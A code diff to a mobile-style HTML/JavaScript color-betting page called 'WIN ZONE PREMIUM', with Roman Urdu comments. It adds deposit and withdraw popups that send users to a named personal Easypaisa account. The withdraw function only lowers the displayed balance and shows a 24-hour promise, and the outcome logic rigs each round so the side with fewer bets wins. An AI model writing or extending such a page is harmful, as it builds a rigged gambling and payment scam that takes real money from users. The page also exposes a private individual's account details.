@@ -27,6 +27,26 @@
             border-radius: 12px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
+        /* Deposit & Withdraw Buttons Style */
+        .wallet-actions {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: -5px 20px 20px 20px;
+        }
+        .btn-wallet {
+            flex: 1;
+            padding: 10px;
+            font-size: 15px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-dep { background-color: #27ae60; color: white; }
+        .btn-with { background-color: #2980b9; color: white; }
+
         .timer-section {
             font-size: 24px;
             margin: 20px 0;
@@ -49,20 +69,25 @@
         }
         .btn-red { background-color: #e74c3c; color: white; }
         .btn-green { background-color: #2ecc71; color: white; }
-        .btn:active { transform: scale(0.95); }
+        .btn:active, .btn-wallet:active { transform: scale(0.95); }
+        
         .input-section {
             margin: 20px;
         }
-        input[type="number"] {
+        input[type="number"], input[type="text"], select {
             padding: 10px;
             font-size: 16px;
             border-radius: 5px;
             border: 1px solid #444;
             background-color: #222;
             color: white;
-            width: 150px;
+            width: 80%;
+            max-width: 250px;
             text-align: center;
+            margin-bottom: 12px;
         }
+        input[type="number"] { width: 150px; }
+        
         .logs {
             background-color: #1f1f1f;
             margin: 20px;
@@ -72,39 +97,129 @@
             max-height: 150px;
             overflow-y: auto;
         }
+
+        /* Popup Modals Style */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background-color: #1e1e1e;
+            padding: 25px;
+            border-radius: 12px;
+            width: 85%;
+            max-width: 350px;
+            border: 1px solid #333;
+            text-align: center;
+        }
+        .modal-content h3 { margin-top: 0; color: #f1c40f; }
+        .account-details {
+            background-color: #2c3e50;
+            padding: 10px;
+            border-radius: 6px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        .close-btn {
+            background-color: #c0392b;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .submit-btn {
+            background-color: #27ae60;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
 
     <div class="header">WIN ZONE PREMIUM</div>
 
-    <!-- User Balance Section -->
     <div class="balance-card">
         <div style="font-size: 14px; opacity: 0.8;">Your Balance</div>
         <div id="balance" style="font-size: 32px; font-weight: bold; margin-top: 5px;">PKR 1,000</div>
     </div>
 
-    <!-- Countdown Timer -->
+    <div class="wallet-actions">
+        <button class="btn-wallet btn-dep" onclick="openModal('depositModal')">Deposit ➕</button>
+        <button class="btn-wallet btn-with" onclick="openModal('withdrawModal')">Withdraw 📤</button>
+    </div>
+
     <div class="timer-section">
         Round Ends In: <span id="timer" style="font-weight: bold;">00:30</span>
     </div>
 
-    <!-- Amount Input -->
     <div class="input-section">
         <label style="display:block; margin-bottom: 8px;">Enter Bet Amount:</label>
         <input type="number" id="betAmount" value="100" min="10">
     </div>
 
-    <!-- Betting Colors -->
     <div class="color-buttons">
         <button class="btn btn-red" onclick="placeBet('Red')">Join Red</button>
         <button class="btn btn-green" onclick="placeBet('Green')">Join Green</button>
     </div>
 
-    <!-- Live Status / Announcement Logs -->
     <div style="padding: 0 20px; font-weight: bold; color: #aaa;">Live Round Status:</div>
     <div class="logs" id="logSection">
         <div>System initialized. Waiting for bets...</div>
+    </div>
+
+    <div id="depositModal" class="modal">
+        <div class="modal-content">
+            <h3>Deposit Funds</h3>
+            <p style="font-size: 13px; color: #bbb;">Neeche diye gaye account par paise send karke TRX ID enter karein:</p>
+            
+            <div class="account-details">
+                Method: Easypaisa<br>
+                Account: 03356161020<br>
+                Name: Muhammad Jaffar
+            </div>
+
+            <select id="depMethod">
+                <option value="Easypaisa">Easypaisa</option>
+                <option value="JazzCash">JazzCash</option>
+            </select>
+            <input type="number" id="depAmount" placeholder="Enter Amount (Min 100)">
+            <input type="text" id="depTrx" placeholder="Enter Transaction ID (TRX ID)">
+            
+            <button class="submit-btn" onclick="submitDeposit()">Submit Deposit Request</button>
+            <button class="close-btn" onclick="closeModal('depositModal')">Close</button>
+        </div>
+    </div>
+
+    <div id="withdrawModal" class="modal">
+        <div class="modal-content">
+            <h3>Withdraw Funds</h3>
+            <p style="font-size: 13px; color: #bbb;">Apna account details aur rayeem enter karein:</p>
+            
+            <select id="withMethod">
+                <option value="Easypaisa">Easypaisa</option>
+                <option value="JazzCash">JazzCash</option>
+            </select>
+            <input type="text" id="withAccount" placeholder="Account Number">
+            <input type="text" id="withName" placeholder="Account Holder Name">
+            <input type="number" id="withAmount" placeholder="Amount to Withdraw">
+            
+            <button class="submit-btn" onclick="submitWithdraw()">Submit Withdraw Request</button>
+            <button class="close-btn" onclick="closeModal('withdrawModal')">Close</button>
+        </div>
     </div>
 
     <script>
@@ -116,11 +231,9 @@
         const timerInterval = setInterval(() => {
             timeLeft--;
             if (timeLeft <= 0) {
-                // Jab timer khatam ho to winner calculate karo (Backend Admin Logic)
                 calculateWinner();
-                timeLeft = 30; // Reset for next round
+                timeLeft = 30; 
             }
-            
             let seconds = timeLeft < 10 ? '0' + timeLeft : timeLeft;
             document.getElementById('timer').innerText = `00:${seconds}`;
         }, 1000);
@@ -128,40 +241,27 @@
         // Bet Lagane Ka Feature
         function placeBet(color) {
             let amount = parseInt(document.getElementById('betAmount').value);
-            
             if (amount > currentBalance) {
-                alert("Insolficient Balance! Pehle deposit karein.");
+                alert("Insufficient Balance! Pehle deposit karein.");
                 return;
             }
-            
             currentBalance -= amount;
             document.getElementById('balance').innerText = `PKR ${currentBalance}`;
-            
-            // Pool me paisa add karna
             fakeBetsPool[color] += amount;
-            
-            // Screen par log show karna
             addLog(`You placed PKR ${amount} on [${color}]`);
         }
 
-        // Automatic Result Feature (The Secret Logic)
+        // Automatic Result Feature (The Least Amount Wins Logic)
         function calculateWinner() {
             let winner = "";
-            
-            // Agar dunya me logo ne Green par zyada lagaya hai, to Red jeetega
-            // Yahan hum system ko automatic "Least Amount Wins" par chala rahe hain
             if (fakeBetsPool.Red < fakeBetsPool.Green) {
                 winner = "Red";
             } else if (fakeBetsPool.Green < fakeBetsPool.Red) {
                 winner = "Green";
             } else {
-                // Agar barabar ho to random nikal lo
                 winner = Math.random() > 0.5 ? "Red" : "Green";
             }
-
             addLog(`🏆 Round Finished! Winner is [${winner}]`);
-            
-            // Reset checking pool for next round
             fakeBetsPool = { Red: 0, Green: 0 };
         }
 
@@ -171,6 +271,59 @@
             newLog.innerText = text;
             logSection.appendChild(newLog);
             logSection.scrollTop = logSection.scrollHeight;
+        }
+
+        // Modal Open/Close Functions
+        function openModal(id) { document.getElementById(id).style.display = "flex"; }
+        function closeModal(id) { document.getElementById(id).style.display = "none"; }
+
+        // Deposit Process Submission
+        function submitDeposit() {
+            let amount = document.getElementById('depAmount').value;
+            let trx = document.getElementById('depTrx').value;
+            let method = document.getElementById('depMethod').value;
+
+            if(!amount || !trx) {
+                alert("Meherbani karke Amount aur TRX ID dono enter karein!");
+                return;
+            }
+            
+            alert(`Deposit Request Sent!\nMethod: ${method}\nAmount: PKR ${amount}\nTRX ID: ${trx}\n\nAdmin verification ke baad balance add ho jayega.`);
+            addLog(`⏳ Deposit Request submitted: PKR ${amount} via ${method} (Pending)`);
+            closeModal('depositModal');
+            
+            // Clear Inputs
+            document.getElementById('depAmount').value = '';
+            document.getElementById('depTrx').value = '';
+        }
+
+        // Withdraw Process Submission
+        function submitWithdraw() {
+            let amount = parseInt(document.getElementById('withAmount').value);
+            let account = document.getElementById('withAccount').value;
+            let name = document.getElementById('withName').value;
+            let method = document.getElementById('withMethod').value;
+
+            if(!amount || !account || !name) {
+                alert("Saari fields fill karna lazmi hai!");
+                return;
+            }
+            if(amount > currentBalance) {
+                alert("Aapka balance withdraw amount se kam hai!");
+                return;
+            }
+
+            currentBalance -= amount;
+            document.getElementById('balance').innerText = `PKR ${currentBalance}`;
+            
+            alert(`Withdrawal Request Sent!\nAmount: PKR ${amount}\nAccount: ${account}\n\nAdmin 24 ghante ke andar transfer kar dega.`);
+            addLog(`📤 Withdraw Request: PKR ${amount} sent to ${account} (${method})`);
+            closeModal('withdrawModal');
+
+            // Clear Inputs
+            document.getElementById('withAmount').value = '';
+            document.getElementById('withAccount').value = '';
+            document.getElementById('withName').value = '';
         }
     </script>
 </body>
